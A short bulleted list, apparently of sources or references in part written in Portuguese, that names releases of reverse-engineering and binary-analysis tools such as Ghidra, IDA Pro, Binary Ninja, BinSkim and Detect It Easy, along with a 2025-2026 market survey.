- BinSkim v4.4.9.7 release (30 Mar 2026) — Microsoft
- Detect It Easy database updates (horsicq/Detect-It-Easy)
- Ghidra 12.1.4 (NSA, set 2026)
- IDA Pro 9.4 (Hex-Rays, jul 2026)
- Binary Ninja 6.0 Krypton (Vector 35, set 2026)
- QEMU 9.x stable, Unicorn 2.1.4 (set 2025)
- HINDSIGHT pesquisa de mercado RE 2025-2026 (22 set 2026)